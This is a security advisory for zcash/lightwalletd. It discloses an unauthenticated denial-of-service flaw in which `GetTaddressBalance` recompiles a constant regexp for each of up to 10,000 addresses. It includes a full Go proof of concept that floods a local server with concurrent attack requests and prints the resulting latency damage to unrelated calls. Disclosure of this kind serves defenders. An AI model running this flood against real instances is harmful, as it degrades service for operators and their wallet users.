# GHSA-x943-ghgq-v675: Public transparent-address lists repeatedly compile a constant regexp and degrade unrelated wallet RPCs

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-x943-ghgq-v675 |
| CVE | none assigned |
| Severity | medium (CVSS 5.3) |
| CWE | CWE-400 |
| Published | 2026-11-18T00:38:17Z |
| Updated | 2026-11-18T00:38:17Z |
| Affected | github.com/zcash/lightwalletd <= 0.6.1 (patched: 0.6.2) |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-x943-ghgq-v675 |

## Description (verbatim)

### Summary


`GetTaddressBalance` validates every distinct transparent-address string with package-level `regexp.Match`. Go compiles the same constant expression on every call. One unauthenticated wallet client can submit the accepted limit of 10,000 distinct entries and force 10,000 redundant regexp compilations before the request reaches the backend.

The local PoC uses the registered production handler over loopback TCP and makes zero backend calls. In three consecutive v0.6.1 runs, the package-level primitive took 40.6–42.5 ms while one precompiled regexp took 1.72–1.77 ms on the same 10,000 strings, isolating a 23.7x–24.0x redundant-compilation cost. During 24 sustained attack clients on a 12-thread server, an unrelated honest `GetBlock` probe showed 143.7x–158.6x P95 latency growth and 98.3%–98.5% sequential-throughput reduction. Latency returned to baseline after a one-second recovery interval.

An untrusted client whose traffic reaches `CompactTxStreamer` can trigger the issue. The client needs no application credential, backend RPC credential, wallet key, funded address, host access, or privileged flag. The demonstrated impact is repeatable low availability impact on one lightwalletd instance.

### Details


The constant pattern is compiled inside the per-address helper:

```go
func checkTaddress(taddr string) error {
	match, err := regexp.Match("\\At[a-zA-Z0-9]{34}\\z", []byte(taddr))
	if err != nil {
		return status.Errorf(codes.InvalidArgument,
			"checkTaddress: invalid transparent address: %s error: %s", taddr, err.Error())
	}
	if !match {
		return status.Errorf(codes.InvalidArgument,
			"checkTaddress: transparent address %s contains invalid characters", taddr)
	}
	return nil
}
```

`getTaddressBalanceZcashdRpc` accepts 10,000 entries and invokes the helper for every distinct value:

```go
if len(addressList) > maxTaddrsPerRequest {
	return nil, status.Errorf(codes.ResourceExhausted,
		"getTaddressBalanceZcashdRpc: too many addresses (limit %d)", maxTaddrsPerRequest)
}

addresses := make([]string, 0)
seen := make(map[string]struct{})
for _, addr := range addressList {
	if _, dup := seen[addr]; dup {
		continue
	}
	if err := checkTaddress(addr); err != nil {
		return nil, err
	}
	seen[addr] = struct{}{}
	addresses = append(addresses, addr)
}
```

The limit is:

```go
const maxTaddrsPerRequest = 10000
```

The trigger contains 9,999 distinct strings with the accepted form `t` plus 34 ASCII hexadecimal characters, followed by one malformed value. Its protobuf encoding is approximately 370 KB, within grpc-go's default 4 MiB receive limit. The distinct prefix survives deduplication. The final value returns `InvalidArgument` after all 10,000 validation calls and before JSON marshaling or backend JSON-RPC. This construction isolates lightwalletd's local CPU and allocation cost from chain state and backend behavior.

Upstream status was rechecked on 2026-11-11. `v0.6.1` is the latest release, and both `v0.6.1` and current `master` retain the same `regexp.Match` call in `checkTaddress`. The v0.6.1 stream-admission and block-range concurrency controls do not apply to this unary `GetTaddressBalance` validation path.

The ordinary production path is:

```text
untrusted wallet client
  -> CompactTxStreamer/GetTaddressBalance
  -> getTaddressBalanceZcashdRpc
  -> 10,000 distinct-address iterations
  -> regexp.Match compiles the same expression 10,000 times
  -> final malformed address returns InvalidArgument
```

The production gRPC server has no application authentication interceptor or aggregate weighted work admission. TLS authenticates the server. Deployment ingress controls final network reachability.

The PoC uses a separate server process with `GOMAXPROCS=12`, a real loopback TCP gRPC connection, the real generated dispatcher, and the real `lwdStreamer` handler. It also benchmarks package-level `regexp.Match` and one precompiled `Regexp.Match` over the identical 10,000-value slice, isolating the setup cost from list cardinality. The honest probe calls `GetBlock` with an empty identifier, so it exercises an unrelated method and completes entirely in local validation. Its 100 ms client deadline is a fixed availability observation window. Attack calls have no deadline and complete with the expected `InvalidArgument` result after executing the vulnerable work.

### Proof of concept


### Requirements

- A checkout of affected lightwalletd `v0.6.1`
- Go 1.26.10 or the Go 1.27.3 version selected by the module toolchain
- Local loopback TCP permission

The PoC contacts no public mainnet, testnet, backend node, or third-party service.

### One-line reproduction

Place the supplied finding directory in the checkout and run from the repository root:

```sh
./findings/confirmed/medium/01-per-address-regexp-compilation/run.sh
```

Equivalent direct command:

```sh
go run ./findings/confirmed/medium/01-per-address-regexp-compilation/poc
```

### Complete `main.go`

```go
package main

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"regexp"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/sirupsen/logrus"
	"github.com/zcash/lightwalletd/common"
	"github.com/zcash/lightwalletd/frontend"
	"github.com/zcash/lightwalletd/walletrpc"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/status"
)

const (
	serverThreads = 12
	attackWorkers = 24
	attackTime    = 4 * time.Second
	baselineTime  = 800 * time.Millisecond
	recoveryTime  = 800 * time.Millisecond
	recoveryDelay = 1 * time.Second
	probeDeadline = 100 * time.Millisecond
)

type phaseResult struct {
	durations []time.Duration
	deadlines int
	other     int
}

func main() {
	if len(os.Args) == 3 && os.Args[1] == "--server" {
		serve(os.Args[2])
		return
	}
	if err := orchestrate(); err != nil {
		fmt.Fprintln(os.Stderr, "PoC failed:", err)
		os.Exit(1)
	}
}

func orchestrate() error {
	address, err := reserveAddress()
	if err != nil {
		return err
	}

	var serverOutput bytes.Buffer
	server := exec.Command(os.Args[0], "--server", address)
	server.Env = append(os.Environ(), fmt.Sprintf("GOMAXPROCS=%d", serverThreads))
	server.Stdout = &serverOutput
	server.Stderr = &serverOutput
	if err := server.Start(); err != nil {
		return fmt.Errorf("start isolated server: %w", err)
	}
	defer func() {
		_ = server.Process.Kill()
		_ = server.Wait()
	}()

	conn, err := dialWhenReady(address, 5*time.Second)
	if err != nil {
		return fmt.Errorf("server did not become ready: %w; output=%s", err, serverOutput.String())
	}
	defer conn.Close()
	client := walletrpc.NewCompactTxStreamerClient(conn)

	control := &walletrpc.AddressList{Addresses: []string{"invalid"}}
	attack := makeAttackRequest()
	packageMatchMedian, precompiledMedian := compareValidationLoops(attack.Addresses)
	for i := 0; i < 3; i++ {
		if _, err := callBalance(client, control); status.Code(err) != codes.InvalidArgument {
			return fmt.Errorf("unexpected control result: %v", err)
		}
		if _, err := callBalance(client, attack); status.Code(err) != codes.InvalidArgument {
			return fmt.Errorf("unexpected attack result: %v", err)
		}
	}

	controlSamples := make([]time.Duration, 31)
	attackSamples := make([]time.Duration, 11)
	for i := range controlSamples {
		controlSamples[i], _ = callBalance(client, control)
	}
	for i := range attackSamples {
		attackSamples[i], _ = callBalance(client, attack)
	}
	controlMedian := percentile(controlSamples, 50)
	attackMedian := percentile(attackSamples, 50)

	baseline := probeFor(client, baselineTime)
	attackCtx, stopAttack := context.WithCancel(context.Background())
	var attacks atomic.Uint64
	var workers sync.WaitGroup
	for i := 0; i < attackWorkers; i++ {
		workers.Add(1)
		go func() {
			defer workers.Done()
			for {
				select {
				case <-attackCtx.Done():
					return
				default:
				}
				_, err := callBalance(client, attack)
				if status.Code(err) == codes.InvalidArgument {
					attacks.Add(1)
				}
			}
		}()
	}

	underAttack := probeFor(client, attackTime)
	stopAttack()
	workers.Wait()
	time.Sleep(recoveryDelay)
	recovery := probeFor(client, recoveryTime)

	baseP95 := percentile(baseline.durations, 95)
	attackP95 := percentile(underAttack.durations, 95)
	recoveryP95 := percentile(recovery.durations, 95)
	if len(baseline.durations) == 0 || len(underAttack.durations) == 0 || len(recovery.durations) == 0 {
		return errors.New("insufficient successful honest probes")
	}

	fmt.Println("PoC: public 10,000-address validation repeatedly recompiles one constant regexp")
	fmt.Printf("server_transport=loopback_TCP server_GOMAXPROCS=%d attacker_workers=%d\n", serverThreads, attackWorkers)
	fmt.Println("backend_calls=0 (the malformed final address returns after all 10,000 validations)")
	fmt.Printf("control_addresses=1 median=%s\n", controlMedian)
	fmt.Printf("attack_addresses=10000 median=%s amplification=%.1fx\n", attackMedian, ratio(attackMedian, controlMedian))
	fmt.Printf("same_10000_values_regexp_Match=%s precompiled_Match=%s redundant_compile_ratio=%.1fx\n", packageMatchMedian, precompiledMedian, ratio(packageMatchMedian, precompiledMedian))
	fmt.Printf("baseline_honest_GetBlock successful=%d deadlines=%d other_errors=%d p95=%s\n", len(baseline.durations), baseline.deadlines, baseline.other, baseP95)
	fmt.Printf("attack_honest_GetBlock successful=%d deadlines=%d other_errors=%d p95=%s p95_slowdown=%.1fx\n", len(underAttack.durations), underAttack.deadlines, underAttack.other, attackP95, ratio(attackP95, baseP95))
	fmt.Printf("honest_probe_baseline_per_second=%.1f attack_per_second=%.1f throughput_reduction=%.1f%%\n", rate(len(baseline.durations), baselineTime), rate(len(underAttack.durations), attackTime), reduction(rate(len(baseline.durations), baselineTime), rate(len(underAttack.durations), attackTime)))
	fmt.Printf("completed_attack_requests=%d\n", attacks.Load())
	fmt.Printf("recovery_honest_GetBlock successful=%d deadlines=%d other_errors=%d p95=%s\n", len(recovery.durations), recovery.deadlines, recovery.other, recoveryP95)
	fmt.Println("result=an_unprivileged_public_RPC_client_caused_repeatable_cross_method_availability_degradation_and_capacity_recovered_after_release")
	return nil
}

func serve(address string) {
	logger := logrus.New()
	logger.SetLevel(logrus.PanicLevel)
	common.Log = logger.WithField("component", "regexp-poc")

	listener, err := net.Listen("tcp", address)
	must(err)
	service, err := frontend.NewLwdStreamer(nil, "main", false, 0)
	must(err)
	server := grpc.NewServer(grpc.MaxRecvMsgSize(4 << 20))
	walletrpc.RegisterCompactTxStreamerServer(server, service)
	must(server.Serve(listener))
}

func makeAttackRequest() *walletrpc.AddressList {
	addresses := make([]string, 10_000)
	for i := 0; i < len(addresses)-1; i++ {
		addresses[i] = fmt.Sprintf("t%034x", i)
	}
	addresses[len(addresses)-1] = "invalid"
	return &walletrpc.AddressList{Addresses: addresses}
}

func callBalance(client walletrpc.CompactTxStreamerClient, request *walletrpc.AddressList) (time.Duration, error) {
	start := time.Now()
	_, err := client.GetTaddressBalance(context.Background(), request)
	return time.Since(start), err
}

func compareValidationLoops(addresses []string) (time.Duration, time.Duration) {
	pattern := regexp.MustCompile("\\At[a-zA-Z0-9]{34}\\z")
	packageSamples := make([]time.Duration, 9)
	precompiledSamples := make([]time.Duration, 9)
	for round := range packageSamples {
		start := time.Now()
		for _, address := range addresses {
			_, _ = regexp.Match("\\At[a-zA-Z0-9]{34}\\z", []byte(address))
		}
		packageSamples[round] = time.Since(start)

		start = time.Now()
		for _, address := range addresses {
			_ = pattern.Match([]byte(address))
		}
		precompiledSamples[round] = time.Since(start)
	}
	return percentile(packageSamples, 50), percentile(precompiledSamples, 50)
}

func probeFor(client walletrpc.CompactTxStreamerClient, duration time.Duration) phaseResult {
	end := time.Now().Add(duration)
	result := phaseResult{}
	for time.Now().Before(end) {
		ctx, cancel := context.WithTimeout(context.Background(), probeDeadline)
		start := time.Now()
		_, err := client.GetBlock(ctx, &walletrpc.BlockID{})
		elapsed := time.Since(start)
		cancel()
		switch status.Code(err) {
		case codes.InvalidArgument:
			result.durations = append(result.durations, elapsed)
		case codes.DeadlineExceeded:
			result.deadlines++
		default:
			result.other++
		}
	}
	return result
}

func percentile(samples []time.Duration, p int) time.Duration {
	if len(samples) == 0 {
		return 0
	}
	copyOf := append([]time.Duration(nil), samples...)
	sort.Slice(copyOf, func(i, j int) bool { return copyOf[i] < copyOf[j] })
	return copyOf[(len(copyOf)-1)*p/100]
}

func ratio(a, b time.Duration) float64 {
	if b == 0 {
		return 0
	}
	return float64(a) / float64(b)
}

func rate(count int, duration time.Duration) float64 {
	return float64(count) / duration.Seconds()
}

func reduction(baseline, observed float64) float64 {
	return (baseline - observed) * 100 / baseline
}

func reserveAddress() (string, error) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return "", err
	}
	address := listener.Addr().String()
	return address, listener.Close()
}

func dialWhenReady(address string, timeout time.Duration) (*grpc.ClientConn, error) {
	deadline := time.Now().Add(timeout)
	var lastErr error
	for time.Now().Before(deadline) {
		ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
		conn, err := grpc.DialContext(ctx, address,
			grpc.WithTransportCredentials(insecure.NewCredentials()),
			grpc.WithBlock(),
			grpc.WithDefaultCallOptions(grpc.MaxCallSendMsgSize(4<<20)),
		)
		cancel()
		if err == nil {
			return conn, nil
		}
		lastErr = err
		time.Sleep(20 * time.Millisecond)
	}
	return nil, fmt.Errorf("dial %s: %w", address, lastErr)
}

func must(err error) {
	if err != nil && !strings.Contains(err.Error(), "use of closed network connection") {
		panic(err)
	}
}
```

### Observed output

```text
PoC: public 10,000-address validation repeatedly recompiles one constant regexp
server_transport=loopback_TCP server_GOMAXPROCS=12 attacker_workers=24
backend_calls=0 (the malformed final address returns after all 10,000 validations)
control_addresses=1 median=78.333µs
attack_addresses=10000 median=52.365792ms amplification=668.5x
same_10000_values_regexp_Match=42.545875ms precompiled_Match=1.773708ms redundant_compile_ratio=24.0x
baseline_honest_GetBlock successful=18101 deadlines=0 other_errors=0 p95=63.875µs
attack_honest_GetBlock successful=1551 deadlines=0 other_errors=0 p95=9.324625ms p95_slowdown=146.0x
honest_probe_baseline_per_second=22626.2 attack_per_second=387.8 throughput_reduction=98.3%
completed_attack_requests=228
recovery_honest_GetBlock successful=17503 deadlines=0 other_errors=0 p95=67.667µs
result=an_unprivileged_public_RPC_client_caused_repeatable_cross_method_availability_degradation_and_capacity_recovered_after_release
```

Two additional consecutive runs produced:

```text
run_1 same_input_redundant_compile_ratio=24.0x attack_GetBlock_p95=11.223667ms p95_slowdown=158.6x throughput_reduction=98.5% recovery_p95=77.916µs
run_3 same_input_redundant_compile_ratio=23.7x attack_GetBlock_p95=9.128833ms p95_slowdown=143.7x throughput_reduction=98.3% recovery_p95=66.167µs
```

### Impact


The vulnerability is unauthenticated resource consumption and cross-method availability degradation in a public wallet-supporting service. A remote client can make accepted requests that spend server CPU and allocation work compiling one immutable regexp 10,000 times. Sustained clients cause honest requests to miss ordinary latency budgets and can keep the instance in a degraded state. Capacity recovers when the traffic ends.

The affected party is the operator of the targeted lightwalletd instance and every wallet using that instance. The measured evidence supports `A:L`. It establishes no persistent outage, process crash, consensus failure, privacy loss, integrity loss, or fund loss.
